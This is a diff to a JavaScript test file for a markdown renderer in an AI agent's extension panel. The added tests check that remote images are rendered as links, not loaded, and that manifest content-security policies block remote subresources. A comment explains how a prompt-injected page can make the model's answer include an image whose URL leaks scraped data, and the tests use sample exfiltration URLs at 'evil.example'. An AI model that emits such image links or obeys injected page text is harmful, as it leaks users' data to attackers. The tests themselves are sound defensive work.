@@ -5,7 +5,10 @@
 // createTextNode / appendChild / setAttribute / textContent, so a shim keeps this dependency-free and
 // simultaneously PROVES the CSP-safety claim — there is no innerHTML on the shim to reach for.
 import assert from 'node:assert/strict';
+import { existsSync, readFileSync } from 'node:fs';
+import { dirname, join } from 'node:path';
 import { test } from 'node:test';
+import { fileURLToPath } from 'node:url';
 
 function element(tag) {
   return {
@@ -157,7 +160,7 @@ test('task lists, strikethrough, images and autolinks render', () => {
 
   assert.equal(find(renderMarkdown('~~gone~~'), 'del').textContent, 'gone');
   assert.equal(
-    find(renderMarkdown('![alt](https://e.com/a.png)'), 'img').getAttribute('alt'),
+    find(renderMarkdown('![alt](data:image/png;base64,AAA)'), 'img').getAttribute('alt'),
     'alt',
   );
   assert.equal(
@@ -177,4 +180,74 @@ test('escaped markdown characters stay literal', () => {
   const frag = renderMarkdown('a \\* not a bullet and \\*\\*not bold\\*\\*');
   assert.equal(findAll(frag, 'strong').length, 0);
   assert.match(frag.textContent, /\*\*not bold\*\*/);
+});
+
+test('a remote image never becomes a fetch the panel makes by itself', () => {
+  // The rendered text is model output derived from the page the agent just read, so a prompt-injected
+  // page can end the answer with an image whose URL carries what was scraped. Drawing it would leak
+  // that with zero clicks, from the profile's own network stack.
+  const frag = renderMarkdown('![x](https://evil.example/p?d=SECRET)');
+  assert.equal(findAll(frag, 'img').length, 0, 'a remote image must never be loaded automatically');
+  const anchor = find(frag, 'a');
+  assert.equal(anchor.getAttribute('href'), 'https://evil.example/p?d=SECRET');
+  assert.equal(anchor.getAttribute('rel'), 'noreferrer noopener');
+  assert.equal(anchor.textContent, 'x');
+  // A pixel with no alt still has to be visible as something the user can choose not to click.
+  const bare = find(renderMarkdown('![](http://evil.example/p)'), 'a');
+  assert.equal(bare.textContent, 'http://evil.example/p');
+
+  // `inline()` runs in every block, so the branch is reachable from all of them.
+  const table = renderMarkdown(
+    ['| a |', '|---|', '| ![](https://evil.example/t.png) |'].join('\n'),
+  );
+  assert.equal(findAll(table, 'img').length, 0);
+  assert.equal(findAll(renderMarkdown('- ![](https://evil.example/l.png)'), 'img').length, 0);
+  assert.equal(findAll(renderMarkdown('> ![](https://evil.example/q.png)'), 'img').length, 0);
+
+  // Inline data: images are still drawn — they cannot reach the network.
+  const inlined = find(renderMarkdown('![chart](data:image/png;base64,AAA)'), 'img');
+  assert.equal(inlined.getAttribute('src'), 'data:image/png;base64,AAA');
+});
+
+test('every extension manifest forbids remote subresources', () => {
+  // The renderer is only half of it. An MV3 `extension_pages` value REPLACES the platform default
+  // outright, so declaring script-src/object-src/connect-src alone leaves img-src unrestricted —
+  // connect-src does not cover subresource loads. The CSP is what still holds if a future renderer
+  // change reintroduces a remote element.
+  const here = dirname(fileURLToPath(import.meta.url));
+  // public/ is the source of truth; the rest are published bundles that only exist after a build, and
+  // are asserted when present so a stale bundle cannot ship a weaker policy than this tree's.
+  const copies = [
+    join(here, '../public/manifest.json'),
+    join(here, '../dist/manifest.json'),
+    join(here, '../../lobee/manifest.json'),
+    join(here, '../../../apps/desktop/src-tauri/resources/lobee/manifest.json'),
+  ].filter((path) => existsSync(path));
+  assert.ok(copies.length > 0, 'the source manifest must exist');
+
+  for (const path of copies) {
+    const csp = JSON.parse(readFileSync(path, 'utf8')).content_security_policy?.extension_pages;
+    assert.ok(csp, `${path}: extension_pages must declare a policy`);
+    const directives = new Map(
+      csp
+        .split(';')
+        .map((part) => part.trim())
+        .filter(Boolean)
+        .map((part) => {
+          const [name, ...sources] = part.split(/\s+/);
+          return [name, sources];
+        }),
+    );
+    for (const name of ['img-src', 'media-src', 'frame-src']) {
+      const sources = directives.get(name);
+      assert.ok(sources, `${path}: ${name} must be declared — extension_pages replaces the default`);
+      for (const source of sources) {
+        assert.ok(
+          !/^\*|^https?:|^\/\//.test(source),
+          `${path}: ${name} must not allow the remote source ${source}`,
+        );
+      }
+    }
+    assert.deepEqual(directives.get('img-src'), ["'self'", 'data:'], `${path}: img-src`);
+  }
 });
